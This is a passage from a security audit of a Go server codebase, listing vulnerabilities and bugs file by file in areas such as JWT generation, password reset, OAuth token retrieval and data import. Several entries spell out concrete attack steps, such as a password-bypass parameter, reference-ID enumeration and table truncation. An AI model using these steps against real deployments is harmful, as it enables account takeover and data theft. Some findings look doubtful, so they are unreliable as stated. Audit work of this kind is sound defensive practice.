  - **Attack vector:** Malicious CA or network interception could compromise certificate generation process
- **Challenge token exposure:** ACME challenges stored in memory map accessible via HTTP endpoint without authentication
- **Private key exposure:** Private keys stored in configuration database, potentially accessible if database compromised

### Authorization Issues
- **No permission validation:** Any authenticated user can generate certificates for any hostname
- **No domain ownership verification:** No validation that user owns or controls the requested hostname
- **Production ACME usage:** Uses Let's Encrypt production servers - can generate valid certificates for any domain

### Logic Issues
- **Transaction scope issues:** Private key storage and certificate generation not properly coordinated within transaction
- **Partial failure states:** If certificate generation fails after key storage, encrypted keys remain in configuration
- **Challenge cleanup:** Challenge map only cleaned on explicit CleanUp calls - tokens may accumulate
- **Memory persistence:** Challenge tokens lost on application restart during certificate generation

### Data Integrity Issues
- **Key format limitations:** ParseRsaPrivateKeyFromPemStr only supports PKCS1 format, will fail on PKCS8 or other formats
- **No key validation:** Generated certificates not validated before storage
- **Certificate chain handling:** Line 225 assumes specific certificate format for chain splitting

### Resource Issues
- **Network timeouts:** ACME operations can be slow with no overall timeout configured beyond HTTP client settings
- **Memory storage:** Challenge tokens stored in memory without size limits
- **Global route registration:** Adds HTTP route to global router that persists for application lifetime

### Operational Issues
- **Production certificate generation:** Uses Let's Encrypt production API which has rate limits and generates real certificates
- **No hostname validation:** Accepts any hostname without format validation or domain ownership checks
- **Error handling:** Many operations continue despite errors, potentially leading to invalid states

### Code Quality Issues
- **Unused field:** `responseAttrs` field in performer struct is never used
- **Complex error flow:** Multiple early returns with different error handling patterns
- **External dependencies:** Heavy reliance on ACME/Let's Encrypt infrastructure availability

---

## server/actions/action_generate_jwt_token.go

### Critical Issues - RUNTIME PANICS
- **Line 44:** Type assertion `inFieldMap["password"].(string)` can panic if password parameter is not string type
- **Line 66:** Type assertion `existingUser["password"].(string)` can panic if password field in database is not string or is nil

### Security Issues - AUTHENTICATION BYPASS AND JWT VULNERABILITIES
- **Password bypass mechanism:** `skipPasswordCheck` parameter allows JWT generation without password verification
  - **Risk:** Any user can potentially generate tokens for other users if they know the email
  - **Impact:** Complete authentication bypass, unauthorized access to any user account
  - **Attack vector:** Set `skipPasswordCheck: true` in request parameters
- **No JWT secret validation:** No verification that JWT signing secret exists or has adequate entropy
- **Weak JWT configuration:** Automatically creates missing JWT configuration without user awareness or strong defaults
- **User account status bypass:** No verification that user account is active, not suspended, or not locked

### Logic Issues - CRITICAL BUG
- **Clock skew bug (Line 73):** `timeNow.Add(-2 * time.Minute)` result not assigned back to timeNow
  - **Impact:** Clock skew adjustment ineffective, tokens may be rejected by validators
  - **Fix needed:** Should be `timeNow = timeNow.Add(-2 * time.Minute)`

### Authorization Issues
- **No rate limiting:** JWT generation not rate-limited, allowing brute force attacks
- **No account lockout:** Failed authentication attempts don't trigger account protection
- **Email parameter validation:** Email not type-checked before database query, could cause query errors

### Data Exposure Issues
- **Error message information leak:** Returns "Invalid username or password" but query errors might leak user existence
- **User data in JWT:** Includes user name and email in JWT claims, potentially exposing PII

### Configuration Security Issues
- **Automatic configuration creation:** Missing JWT configuration automatically created without strong defaults
- **Weak issuer generation:** Random 6-character issuer could create conflicts in distributed environments
- **Token lifetime:** No validation on configured token lifetime values, could be set to excessive durations

### Code Quality Issues
- **Ignored error values:** Line 39 uses `_` pattern to ignore type assertion errors for skipPasswordCheck
- **Complex authentication logic:** Multiple code paths for authentication with different error handling
- **Resource usage:** Uses `resource.CheckErr()` which may log but doesn't necessarily fail operations

### Operational Issues
- **JWT secret management:** No guidance or validation for proper JWT secret generation and storage
- **Cookie security:** Sets SameSite=Strict but no HttpOnly or Secure flags mentioned
- **Session persistence:** JWT tokens stored in both client storage and cookies, potential inconsistency

---

## server/actions/action_generate_oauth2_token.go

### Security Issues - CRITICAL OAUTH TOKEN EXPOSURE
- **Unrestricted OAuth token access:** No authorization checks - any authenticated user can retrieve any OAuth token by reference ID
  - **Risk:** Complete OAuth credential exposure for any stored token
  - **Impact:** Unauthorized access to external services using other users' OAuth tokens
  - **Attack vector:** Enumerate reference IDs to extract all stored OAuth credentials
- **Sensitive token data exposure:** Returns complete OAuth token information including:
  - Access tokens - Direct API access credentials
  - Refresh tokens - Long-term credential renewal capability
  - Expiry information - Token validity windows

### Authorization Issues
- **No ownership validation:** No verification that requesting user owns or has access to the specified OAuth token
- **Reference ID enumeration:** No protection against systematic reference ID guessing/enumeration attacks
- **Missing permission checks:** No role-based or resource-level access control

### Logic Issues
- **Token validity bypass:** No verification that returned token is still valid or not expired
- **Error exposure:** Database errors returned directly to client, potentially leaking system information
- **Token existence handling:** No explicit check if token was found - could return empty/nil token data

### Data Integrity Issues
- **No token state validation:** Returns tokens regardless of their current state (active, revoked, expired)
- **Reference ID validation gap:** Only checks for null reference, no format or existence validation
- **Duplicate response data:** Returns same token data in both api2go.Responder and ActionResponse

### Code Quality Issues
- **Unused field:** `secret []byte` field declared but never initialized or used
- **Unused parameter:** `configStore` parameter in constructor completely ignored
- **Missing functionality:** Constructor suggests secret-based operations but implementation doesn't use secrets

### Resource Issues
- **No rate limiting:** OAuth token retrieval not rate-limited, enabling bulk extraction attacks
- **No audit logging:** Token access not logged for security monitoring

**CRITICAL SECURITY IMPACT:** This action allows unauthorized access to stored OAuth credentials for external services, potentially compromising user accounts on third-party platforms.

---

## server/actions/action_generate_password_reset_flow.go

### Critical Issues - RUNTIME PANICS
- **Line 57:** Type assertion `existingUser["email"].(string)` can panic if email field is not string type
- **Lines 86-87, 91-92:** Email parsing with `strings.Split(email, "@")` can cause array index out of bounds panics if:
  - Email contains no "@" character
  - Email is empty string
  - Multiple "@" characters causing unexpected array structure

### Security Issues - CRITICAL VULNERABILITIES
- **Password reset token exposure (Line 73):** `fmt.Printf("%v %v", tokenStringBase64, err)` prints sensitive reset tokens to stdout/logs
  - **Risk:** Reset tokens logged and potentially accessible in log files
  - **Impact:** Unauthorized password resets if logs are compromised
  - **Attack vector:** Log file access or log aggregation systems
- **User enumeration vulnerability:** Different error messages reveal whether email exists in system
  - "No Such account" vs success message allows attackers to enumerate valid email addresses
- **No rate limiting:** Password reset requests not rate-limited, enabling:
  - Email bombing attacks
  - Resource exhaustion
  - Systematic user enumeration

### Logic Issues - IMPLEMENTATION BUGS
- **Line 155:** Variable assignment bug - assigns to `jwtTokenIssuer` instead of `passwordResetEmailFrom`
- **Line 156:** Configuration storage bug - stores `hostname` instead of constructed email address
- **Token lifetime inconsistency:** Hard-coded 30-minute expiration ignores `tokenLifeTime` configuration
- **Transaction scope issue:** Creates transaction in constructor with deferred commit, could cause resource leaks

### Security Issues - PASSWORD RESET VULNERABILITIES
- **Token delivery method:** Base64 token sent as plain text in email body instead of proper reset link/URL
- **No email validation:** No verification that email parameter contains valid email format
- **Token format exposure:** Raw JWT token structure exposed in email, revealing system internals
- **Email parsing vulnerabilities:** No validation of email format before string operations

### Data Exposure Issues
- **Error information leak:** Database errors might reveal system information through different response paths
- **Email validation bypass:** Invalid email formats processed without validation
- **System hostname exposure:** Uses `os.Hostname()` which could expose internal system names

### Authorization Issues
- **No account status checks:** Sends password reset emails regardless of account status (active, suspended, locked)
- **No email ownership verification:** No additional verification that requester owns the email address

### Code Quality Issues
- **Unused configuration:** `tokenLifeTime` field loaded from config but not used in DoAction
- **Inconsistent error handling:** Some errors cause function return, others just log and continue
- **Missing input validation:** Email parameter not type-checked before database operations

### Operational Issues
- **Email dependency:** Password reset functionality completely dependent on email infrastructure availability
- **Configuration auto-creation:** Missing configuration values automatically created without admin awareness
- **Log pollution:** Debug prints in production code (line 73) pollute application logs

---

## server/actions/action_generate_password_reset_verify_flow.go

### Critical Issues - RUNTIME PANICS
- **Line 44:** Type assertion `token.(string)` can panic if token parameter is not string type

### Security Issues - CRITICAL PASSWORD RESET VULNERABILITIES
- **Incomplete password reset flow:** Token verification succeeds but **DOES NOT ACTUALLY RESET THE PASSWORD**
  - **Risk:** Valid password reset tokens verified but password remains unchanged
  - **Impact:** Password reset functionality is broken - users cannot complete password resets
  - **Missing functionality:** No actual password update mechanism in verification flow
- **Authentication confusion:** Returns "Logged in" success message without establishing actual session
  - **Risk:** Users believe they are authenticated when they are not
  - **Impact:** False security state, potential user confusion and security bypasses
- **User enumeration vulnerability:** Different error messages reveal whether email exists in system
  - "No Such account" vs token validation errors allow email enumeration attacks

### Logic Issues - BROKEN FUNCTIONALITY
- **Missing password update:** Core password reset functionality missing - token validation without password change
- **No session establishment:** Claims user is "Logged in" but provides no authentication tokens or session data
- **Token claims ignored:** JWT token contains user information (email, user ID) but these are not validated against request
- **Incomplete verification:** Only checks token signature and expiration, no additional security validations

### Security Issues - TOKEN AND TIMING VULNERABILITIES
- **No rate limiting:** Password reset token verification not rate-limited, enabling brute force attacks
- **Timing attack vulnerability:** Different response times between user lookup and token validation could leak information
- **Token replay potential:** No mechanism to prevent reuse of valid password reset tokens
- **Email parameter validation:** Email not type-checked before database operations

### Authorization Issues
- **No ownership validation:** No verification that requesting user is the same as the user in the JWT token claims
- **Missing cross-verification:** Token email claims not compared against request email parameter
- **No account status checks:** Verifies tokens for any account regardless of status (active, suspended, locked)

### Code Quality Issues
- **Unused configuration:** `tokenLifeTime` and `jwtTokenIssuer` loaded from config but not used in verification logic
- **Transaction management:** Creates transaction in constructor with deferred commit, potential resource issues
- **Misleading success messages:** "Logged in" message when no authentication actually occurs

### Data Integrity Issues
- **Broken user flow:** Password reset process incomplete, leaving users unable to actually reset passwords
- **State inconsistency:** Success responses without corresponding state changes in authentication or password data

**CRITICAL FUNCTIONALITY BUG:** This action appears to be a critical part of the password reset flow but is completely non-functional - it validates tokens but does not reset passwords, breaking the entire password reset mechanism.

---

## server/actions/action_generate_random_data.go

### Critical Issues - RUNTIME PANICS
- **Line 43:** Type assertion `inFields[resource.USER_ACCOUNT_ID_COLUMN].(string)` can panic if USER_ACCOUNT_ID_COLUMN field is not string type
- **Line 49:** Type assertion `inFields["table_name"].(string)` can panic if table_name parameter is not string type
- **Line 57:** Type assertion `inFields["count"].(float64)` can panic if count parameter is not float64 type
- **Line 71:** Array access `foreignRow[0]` can panic if foreignRow is empty despite length check on line 67

### Security Issues - DATA INTEGRITY AND RESOURCE ABUSE
- **Unrestricted data generation:** No authorization checks - any authenticated user can generate unlimited fake data
  - **Risk:** Database flooding with fake data
  - **Impact:** Database storage exhaustion, performance degradation, data pollution
  - **Attack vector:** Large count values to exhaust system resources
- **No input validation:** Count parameter not validated for reasonable bounds
  - **Risk:** Resource exhaustion attacks via extremely large count values
  - **Impact:** Memory exhaustion, database locks, system unavailability

### Logic Issues - DATA CONSISTENCY PROBLEMS
- **Foreign key race conditions:** Line 71 accesses `foreignRow[0]` after checking length but array could be modified
- **Error continuation:** Individual row insertion errors logged but don't stop overall process, resulting in partial data generation
- **Permission uniformity:** All generated rows get `auth.DEFAULT_PERMISSION` regardless of user context or table requirements
- **Transaction scope issues:** Long-running operations within transaction may cause database locks and timeouts

### Data Integrity Issues
- **No foreign key validation:** No verification that foreign key references remain valid after generation
- **Column constraint bypass:** Generated fake data may not respect column constraints (length, format, uniqueness)
- **Standard column handling:** Relies on linear search through `resource.StandardColumns` which is inefficient and error-prone
- **Data type consistency:** No validation that generated fake data matches expected column data types

### Resource Issues
- **Memory consumption:** Large count values load all generated rows into memory before batch insertion
- **Database impact:** Multiple individual insertions instead of bulk operations, causing performance issues
- **Transaction duration:** Long-running transactions for large datasets may cause lock contention
- **No rate limiting:** Data generation operations not rate-limited, enabling resource abuse

### Authorization Issues
- **No table access validation:** Any user can generate data for any table without permission checks
- **Permission override:** Generated data uses default permissions regardless of user's actual permissions on the table
- **User context validation:** No verification that provided user_reference_id matches authenticated user

### Code Quality Issues
- **Error handling inconsistency:** Some errors cause function termination, others just log and continue
- **Logging pollution:** Generates verbose logs for each operation that could fill log files
- **Inefficient column processing:** Linear search through standard columns for every column of every generated row

### Operational Issues
- **Data pollution:** Generates fake data that could interfere with production data analysis
- **No cleanup mechanism:** No built-in way to identify or remove generated fake data
- **Foreign key dependency:** Requires existing data for foreign key relationships, may fail on empty tables

---

## server/actions/action_generate_self_tls_certificate.go

### Critical Issues - RUNTIME PANICS
- **Line 24:** Type assertion `inFieldMap["certificate"].(map[string]interface{})` can panic if certificate parameter is not map type
- **Line 27:** Type assertion `certificateSubject["hostname"].(string)` can panic if hostname field is not string type

### Security Issues - CERTIFICATE GENERATION VULNERABILITIES
- **Unrestricted certificate generation:** No authorization checks - any authenticated user can generate certificates for any hostname
  - **Risk:** Certificate generation for domains not owned by the user
  - **Impact:** Potential impersonation of other domains, SSL/TLS security bypass attempts
  - **Attack vector:** Generate certificates for high-value domains (banking, government, etc.)
- **No hostname ownership verification:** No validation that user owns or controls the requested hostname
  - **Risk:** Certificates generated for domains the user doesn't control
  - **Impact:** Could facilitate phishing attacks or domain impersonation
- **Certificate data logging (Line 33):** `log.Printf("Cert generated: %v ", cert.CertPEM)` exposes certificate PEM data in logs
  - **Risk:** Certificate private keys or sensitive certificate data in log files
  - **Impact:** Certificate compromise if logs are accessible to unauthorized parties

### Authorization Issues
- **No domain validation:** No checks to verify user has legitimate access to generate certificates for requested hostname
- **Missing permission checks:** No role-based or domain-specific access control for certificate generation
- **Self-signed certificate implications:** Self-signed certificates can be used to bypass browser security warnings in controlled environments

### Input Validation Issues
- **No hostname validation:** Hostname parameter not validated for:
  - Format correctness (valid domain format)
  - Length restrictions
  - Character restrictions (preventing injection attacks)
  - Blacklisted domains or reserved names
- **No certificate parameter validation:** Certificate subject map structure not validated

### Logic Issues
- **Complete dependency on certificateManager:** Entire functionality delegated to external component without error handling specifics
- **Unused fields:** Multiple struct fields (responseAttrs, cruds, configStore, encryptionSecret) loaded but never used
- **Transaction scope:** Database transaction passed to certificate manager but unclear how it's used

### Code Quality Issues
- **Resource waste:** Multiple unused fields and parameters suggest incomplete or over-engineered implementation
- **Lack of input sanitization:** No preprocessing or validation of hostname input
- **Missing error context:** Certificate generation errors returned without additional context

### Operational Issues
- **Certificate management dependency:** Relies entirely on external certificateManager implementation
- **Self-signed certificates:** Generated certificates will trigger browser security warnings
- **No certificate lifecycle management:** No indication of certificate expiration, renewal, or revocation handling

---

## server/actions/action_import_cloudstore_files.go

### COMPILATION ERRORS - CRITICAL
- **Line 114:** `json.Marshal()` called but `json` package not imported - **CODE WILL NOT COMPILE**

### Critical Issues - RUNTIME PANICS
- **Line 35:** Type assertion `inFields["table_name"].(string)` can panic if table_name parameter is not string type
- **Line 70:** Multiple nested map access `AssetFolderCache[tableName][colName]` can panic if any intermediate map is nil
- **Line 81:** `strings.Split(cacheFolder.CloudStore.RootPath, ":")[0]` can panic if RootPath contains no ":" character
- **Line 120:** UUID conversion `u[:]` converts to byte slice instead of expected string format for reference_id

### Security Issues - CREDENTIAL AND ACCESS CONTROL
- **Global credential exposure:** Lines 87-89 apply cloud store credentials to global rclone configuration without cleanup
  - **Risk:** Credentials persist in global state after operation completion
  - **Impact:** Potential credential leakage between operations or users
  - **Attack vector:** Subsequent operations could access previously set credentials
- **No authorization checks:** Any authenticated user can import files from any cloud store
- **Path traversal potential:** No validation on cloud store paths - could access unauthorized directories

### Logic Issues - DATA INTEGRITY PROBLEMS
- **UUID format bug (Line 120):** `defaltValues["reference_id"] = u[:]` sets byte slice instead of string
  - **Impact:** Reference IDs will be binary data instead of expected string format
  - **Database issues:** May cause database constraint violations or data corruption
- **Redundant data copy (Lines 62-64):** Loop copies `defaltValues` to itself unnecessarily
- **Error continuation:** Individual file import failures logged but don't stop overall import process
- **Incomplete file metadata:** Only stores file name, ignoring size, modification time, permissions, etc.

### Resource Issues
- **Transaction scope problems:** Long-running cloud storage operations within database transaction
  - **Risk:** Database lock duration, timeout potential
  - **Impact:** Database performance degradation, potential deadlocks
- **External dependency blocking:** Cloud storage connectivity issues can block database operations
- **Memory usage:** No limits on number of files processed, could cause memory exhaustion

### Data Quality Issues
- **Minimal file metadata:** Only captures file name in JSON structure, missing critical file attributes
- **No duplicate handling:** No mechanism to prevent importing the same files multiple times
- **No file validation:** No verification that listed files actually exist or are accessible

### Code Quality Issues
- **Unused parameter:** `initConfig` parameter in constructor completely ignored
- **Nested map access:** Deep map nesting without nil checks creates fragile code
- **Error handling inconsistency:** Some errors cause function return, others just log and continue

### Operational Issues
- **Global state pollution:** Rclone configuration modified globally without proper cleanup
- **Cloud storage dependency:** Functionality completely dependent on external cloud storage availability
- **No progress tracking:** Long-running imports provide no progress feedback to users

---

## server/actions/action_import_data.go

### COMPILATION ERRORS - CRITICAL
- **Line 117:** `DetectFileFormat(fileBytes, fileName)` called but function not imported/defined - **CODE WILL NOT COMPILE**
- **Line 118:** `CreateStreamingImportParser(format)` called but function not imported/defined - **CODE WILL NOT COMPILE**

### Critical Issues - RUNTIME PANICS
- **Line 40:** Type assertion `user.(map[string]interface{})` can panic if user parameter is not map type
- **Line 65:** Type assertion `inFields["dump_file"].([]interface{})` can panic if dump_file is not array type
- **Line 79:** Type assertion `fileInterface.(map[string]interface{})` can panic if file element is not map type
- **Line 85:** Type assertion `file["name"].(string)` can panic if name field is not string type
- **Line 91:** Type assertion `file["file"].(string)` can panic if file content field is not string type
- **Line 125:** Type assertion `tableName.(string)` can panic if table_name parameter is not string type

### Security Issues - DESTRUCTIVE DATA OPERATIONS
- **Unrestricted data import:** No authorization checks - any authenticated user can import data into any table
  - **Risk:** Malicious data injection, data corruption, unauthorized database modification
  - **Impact:** Complete database compromise through malicious import files
  - **Attack vector:** Crafted import files with malicious SQL, XSS payloads, or oversized data
- **Table truncation capability:** `truncate_before_insert` option allows complete table data deletion
  - **Risk:** Irreversible data loss through table truncation
  - **Impact:** Complete data destruction for entire tables
  - **Attack vector:** Set truncate_before_insert=true to delete all table data
- **No file content validation:** Import files processed without security validation
  - **Risk:** Malicious file content executed or stored
  - **Impact:** Code injection, data corruption, system compromise

### Logic Issues - DATA INTEGRITY PROBLEMS
- **Duplicate type assertions:** Line 125 and 144 both perform `tableName.(string)` conversion
- **Error continuation:** Individual row insertion failures don't stop overall import, causing partial data states
- **Base64 parsing assumptions:** Line 98 assumes comma-separated base64 format which may not always be valid
- **Memory loading:** Entire file contents loaded into memory before processing, no streaming for large files

### Resource Issues - PERFORMANCE AND SCALABILITY
- **Transaction scope problems:** Long-running import operations within database transaction
  - **Risk:** Database locks, transaction timeouts, resource contention
  - **Impact:** Database performance degradation, potential deadlocks
- **Memory consumption:** No limits on file sizes - large import files could exhaust system memory
- **No rate limiting:** Import operations not rate-limited, enabling resource abuse attacks
- **Batch size validation:** Only checks `intVal > 0` but no upper bound validation

### Authorization Issues
- **No table access validation:** Any user can import data into any accessible table
- **No permission checks:** Import operation doesn't verify user has write permissions on target tables
- **User context injection:** Imported rows automatically assigned to requesting user without validation

### Data Quality Issues
- **No data validation:** Imported data not validated for column constraints, data types, or business rules
- **No duplicate handling:** No mechanism to prevent importing duplicate records
- **Foreign key integrity:** No validation that foreign key references in imported data are valid
- **Column mapping:** No validation that import file columns match target table schema

### Code Quality Issues
- **Unused field:** `cmsConfig` stored in struct but never used in implementation
- **Missing function dependencies:** Code references undefined functions preventing compilation
- **Error handling inconsistency:** Some errors cause function return, others just log and continue

### Operational Issues
- **No progress tracking:** Long-running imports provide no progress feedback to users
- **No rollback mechanism:** Failed imports leave database in partially modified state
- **No import validation:** Files processed without format or content validation before database operations

---

## server/actions/action_integration_execute.go

### COMPILATION ERRORS - CRITICAL
- **Line 78:** `json.Unmarshal([]byte(decryptedSpec), &authKeys)` called but `json` package not imported - **CODE WILL NOT COMPILE**
- **Line 708:** `json.Unmarshal(yamlBytes, &openapiv2Spec)` called but `json` package not imported - **CODE WILL NOT COMPILE**
- **Line 726:** `json.Unmarshal(yamlBytes, &router)` called but `json` package not imported - **CODE WILL NOT COMPILE**

### Critical Issues - RUNTIME PANICS (EXTENSIVE TYPE ASSERTION VULNERABILITIES)
- **Line 120:** Type assertion `value.(string)` can panic if URL parameter value is not string
- **Line 125:** Type assertion `urlValue.(string)` can panic if evaluated URL result is not string
- **Lines 156, 159:** Type assertion `requestBody.(map[string]interface{})` can panic if request body is not map type
- **Lines 215-216:** Type assertions `authKeys["username"].(string)` and `authKeys["password"].(string)` can panic if not strings
- **Line 267:** Type assertion `authKeys[name].(string)` can panic if API key value is not string
- **Line 316:** Type assertion `authKeys["scheme"].(string)` can panic if auth scheme is not string
- **Lines 318, 319, 330, 345, 346, 356, 357, 365, 366:** Multiple unhandled type assertions throughout authentication logic
- **Line 529:** Type assertion `str.(string)` in CreateRequestBody can panic if string value is not string type
- **Line 508:** Type assertion `value.(string)` in number parsing can panic

### Security Issues - EXTERNAL API AND AUTHENTICATION VULNERABILITIES
- **Unrestricted external API calls:** No authorization checks - any authenticated user can execute any integration
  - **Risk:** Unauthorized access to external APIs using stored credentials
  - **Impact:** Data exfiltration, unauthorized API usage, cost implications for API usage
  - **Attack vector:** Execute high-privilege API operations using other users' credentials
- **Authentication credential exposure:** Multiple authentication methods handled without proper validation:
  - OAuth tokens, API keys, basic auth credentials used without ownership verification
  - Credentials decrypted and used without verifying user has access to them
- **URL parameter injection:** Line 120 directly injects user input into URLs without validation
  - **Risk:** URL manipulation, injection attacks on external APIs
  - **Impact:** Unintended API calls, parameter pollution, potential SSRF attacks
- **No rate limiting:** External API calls not rate-limited, enabling abuse of external services

### Logic Issues - AUTHENTICATION AND REQUEST HANDLING
- **OAuth token refresh race conditions:** Lines 196-204 refresh tokens without proper concurrency control
- **Duplicate authentication processing:** Lines 171-285 and 287-374 implement same authentication logic twice
- **Request parameter handling:** Complex parameter processing (lines 376-415) with minimal error handling
- **Response processing assumptions:** Line 439 assumes all responses are JSON-parseable

### Resource Issues - EXTERNAL DEPENDENCIES AND PERFORMANCE
- **External API dependency:** Complete functionality dependent on external API availability
- **No timeout controls:** HTTP requests made without timeout specifications
- **Memory usage:** Complex schema processing and recursive object creation without bounds checking
- **Transaction scope:** Database operations mixed with external API calls within same transaction

### Data Exposure Issues
- **Authentication spec logging:** Decrypted authentication specifications potentially logged in error messages
- **API response exposure:** External API responses returned directly to clients without filtering
- **Error information leakage:** Detailed error messages from external APIs exposed to users

### Authorization Issues
- **No integration access control:** Any user can execute any integration without permission validation
- **Cross-user credential access:** No verification that requesting user owns the credentials being used
- **External API privilege escalation:** Users can execute API operations with higher privileges than they should have

### Code Quality Issues
- **Massive function complexity:** DoAction() function is 400+ lines with complex branching logic
- **Duplicate code:** Authentication handling duplicated between OpenAPI security and fallback methods
- **Unused parameter:** `initConfig` parameter in constructor completely ignored
- **Error handling inconsistency:** Some errors cause function return, others just log and continue

### Operational Issues
- **OpenAPI specification trust:** No validation that OpenAPI specs are safe or don't contain malicious endpoints
- **External service dependency:** Integration functionality completely dependent on external API availability
- **Credential management complexity:** Multiple authentication types handled with complex, error-prone logic

---

## server/cache/utils.go

### Security Issues
- **Content-type injection:** Uses `strings.Contains()` for MIME type matching without proper parsing
- **No input validation:** Content-type parameter not validated for format or length
- **Case sensitivity issues:** Content type matching is case-sensitive but HTTP headers are case-insensitive
- **Incomplete MIME coverage:** Missing many compressed formats in exclusion list

### Potential Attack Vectors
- **Content-type header manipulation:** Bypass compression checks through malicious content-type headers
- **Resource exhaustion:** Force compression of large, incompressible data

---

## server/cloud_store/cloud_store.go

### Critical Issues - RUNTIME PANICS
- **Lines 33, 37, 54, 61, 65, 75, 76, 77:** Multiple unhandled type assertions can crash application
- **Line 44:** CheckErr called with potentially nil error variable causing misleading logs

### Security Issues
- **JSON deserialization:** Unmarshals store parameters without size limits or validation - JSON bomb risk
- **Data validation gaps:** No validation of cloud store configuration integrity
- **Reference ID security:** Invalid reference IDs could cause permission bypass

### Type Assertion Vulnerabilities
- `storeRowMap["name"].(string)` - Can panic if name is not string
- `storeRowMap["store_parameters"].(string)` - Can panic if parameters not string  
- `storeRowMap["store_provider"].(string)` - Can panic if provider not string
- `storeRowMap["root_path"].(string)` - Can panic if root_path not string

---

## server/cloud_store/utils.go

### Critical Issues - RUNTIME PANICS
- **Lines 7, 23, 37:** Type assertion `message[0].(string)` can panic if first parameter not string
- **Lines 7, 23, 37:** Array access `message[0]` can panic if message slice is empty

### Security Issues - FORMAT STRING VULNERABILITIES
- **Lines 13, 29, 43:** User-controlled format strings passed to logging functions - format string injection risk
- **Log injection attacks:** Error messages with newlines and special characters can corrupt logs
- **Information disclosure:** Format specifiers in error messages could leak sensitive data

### Code Quality Issues
- **Duplicate functions:** InfoErr and CheckInfo are functionally identical
- **Improper error context:** Error information mixed with format parameters

---

## server/columns/columns.go

### Code Quality Issues
- **Unstructured tag storage:** Tags field is unstructured string without defined format
- **Missing validation:** No validation methods or constraints for struct fields
- **Potential indirect risks:** Usage patterns could create injection vulnerabilities if not properly validated

### Design Issues
- **No field validation framework**
- **Missing documentation of expected tag format**
- **No parsing methods for Tags field**

---

## server/columntypes/mtime.go

### Security Issues
- **Minimal input validation:** Only basic "0000" string check, no length or content validation
- **Resource exhaustion:** No limits on input string length or parsing attempts
- **Default time return vulnerability:** Returns `time.Now()` on parsing failure instead of zero time
- **Error information disclosure:** Error messages include user input potentially enabling log injection

### Logic Issues
- **Complex date range validation:** Magic numbers (182943 hours) without clear meaning
- **Inconsistent timezone handling:** Mixed timezone support across different formats
- **Performance concerns:** Linear format search with no early termination

---

## server/columntypes/types.go

### 🚨 CRITICAL SECURITY VULNERABILITIES
- **JSON bomb attacks (Lines 241-248):** Unrestricted JSON unmarshaling without size or depth limits - **IMMEDIATE MEMORY EXHAUSTION RISK**
- **Regular Expression DoS (Lines 566-580, 589-594):** Unsafe regex compilation and execution - **CPU EXHAUSTION RISK**
- **Type assertion panics (Lines 566, 583, 372, 382, etc.):** Multiple unhandled type assertions can crash application

### Critical Issues - TYPE DETECTION VULNERABILITIES
- **Resource exhaustion:** Unbounded iteration through all detection types for large datasets
- **Regex compilation errors ignored:** Failed regex compilation results in nil pointers causing crashes
- **Time parsing vulnerabilities:** Complex time parsing without input validation
- **No resource consumption controls:** No limits on processing time or memory usage

### Attack Vectors Identified
- **JSON structure attacks:** Deeply nested JSON or massive arrays to exhaust memory
- **ReDoS patterns:** Malicious strings causing exponential regex backtracking
- **Type detection exhaustion:** Large datasets requiring testing all type detectors
- **Unicode exploitation:** Special characters to exploit regex and parsing edge cases

---

## server/constants/constants.go

### Security Issues - API SURFACE EXPOSURE
- **API path enumeration:** Complete list of API endpoints exposed assists attackers in understanding system structure
- **Missing security context:** No authentication, authorization, or rate limiting requirements specified for paths
- **Attack surface mapping:** Reveals all available endpoints for reconnaissance

### Design Issues
- **Static configuration limitations:** Hardcoded paths limit runtime security flexibility
- **No security annotations:** Missing authentication and access control metadata for each path
- **No environment support:** Cannot adapt security requirements based on deployment environment

---

## server/csvmap/csvmap_test.go

### 🚨 CRITICAL TEST COVERAGE GAP
- **Empty test file:** No validation of CSV parsing security vulnerabilities
- **Function name typo:** "TestCavMap" instead of "TestCsvMap" indicates lack of attention
- **Missing critical test cases:** No tests for CSV injection, resource exhaustion, malformed input, or edge cases

### Security Risk
- **Undetected vulnerabilities:** CSV processing functionality deployed without security validation
- **No regression protection:** Security fixes cannot be verified
- **Production risk:** CSV injection and DoS vulnerabilities unprotected

---

## server/csvmap/csvmap.go

### 🚨 CRITICAL SECURITY VULNERABILITIES
- **CSV injection vulnerability:** No validation or sanitization of CSV field content - **FORMULA INJECTION RISK**
- **Resource exhaustion (Lines 47-56):** Unbounded memory growth in ReadAll() - **MEMORY EXHAUSTION RISK**
- **Column name injection:** Column names not validated, could cause downstream issues

### Attack Vectors Identified
- **Formula injection:** CSV fields starting with =, +, -, @ could execute commands in spreadsheet applications
- **Memory exhaustion:** Large CSV files can cause DoS through resource consumption
- **Data structure attacks:** Malicious column names with special characters or extreme length

### Missing Security Controls
- **No input validation:** No limits on file size, column count, or field length
- **No sanitization:** Dangerous CSV content not sanitized before processing
- **Error information disclosure:** User-controlled data included in error messages

---

## server/database/database_connection_interface.go

### Security Issues - INTERFACE DESIGN
- **SQL injection risk:** Interface allows raw SQL query execution without built-in protection
- **Transaction management concerns:** Mixed error handling approaches (`MustBegin()` panics vs `Beginx()` returns error)
- **Missing security methods:** No query validation, SQL injection protection, or audit logging interfaces

### Design Issues
- **No context support:** Methods lack context.Context for timeout control
- **Interface composition complexity:** Embedded interfaces increase attack surface
- **Missing security-specific methods:** No query validation or audit logging capabilities

### Implementation Risks
- **Security depends on implementations:** Interface provides no security guarantees
- **Potential for insecure usage patterns:** Raw SQL construction instead of parameterization
- **Resource management gaps:** No explicit connection lifecycle management

---

## server/dbresourceinterface/credential.go

### 🚨 CRITICAL CREDENTIAL SECURITY ISSUES
- **Unstructured sensitive data storage:** Credentials stored in unvalidated `map[string]interface{}` without encryption indicators
- **Missing security metadata:** No encryption status, access control, expiration, or audit fields
- **Data exposure in serialization:** Structure could expose sensitive data during JSON/XML serialization
- **No input validation framework:** No validation methods or constraints for credential data

### Security Risks
- **Credential exposure:** No indication of encryption status or secure storage practices
- **Data integrity issues:** Untyped storage could lead to corruption or type assertion failures
- **Injection attacks:** Malicious data could be stored in credential maps without validation

---

## server/dbresourceinterface/interface.go

### 🚨 CRITICAL SECURITY VULNERABILITIES - CORE INTERFACE
- **Unrestricted data access (Line 16):** `GetAllObjects()` allows complete table access without filtering - **MASS DATA EXFILTRATION RISK**
- **Credential access without validation (Line 23):** `GetCredentialByName()` has no access control - **CREDENTIAL EXPOSURE RISK**
- **Permission system dependency:** Permission checking relies on potentially spoofable reference IDs
- **Action handling without authorization:** Action execution without explicit security validation

### Missing Security Controls - CRITICAL GAPS
- **No authentication context:** Interface methods lack user authentication requirements
- **No access control validation:** Core data access methods have no built-in permission checking
- **No audit logging:** Security-sensitive operations not logged
- **Admin email exposure:** Admin contact information accessible without authorization

